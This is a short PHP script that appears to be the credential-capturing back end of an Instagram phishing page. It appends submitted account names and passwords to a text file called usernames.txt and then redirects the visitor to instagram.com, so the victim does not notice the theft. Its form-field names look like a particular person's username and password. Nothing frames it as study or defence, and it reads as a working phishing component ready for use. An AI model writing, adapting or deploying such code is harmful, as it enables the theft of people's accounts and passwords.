<?php

file_put_contents("usernames.txt", "Account: " . $_POST['daisa.colection'] . " Pass: " . $_POST['raditya13'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
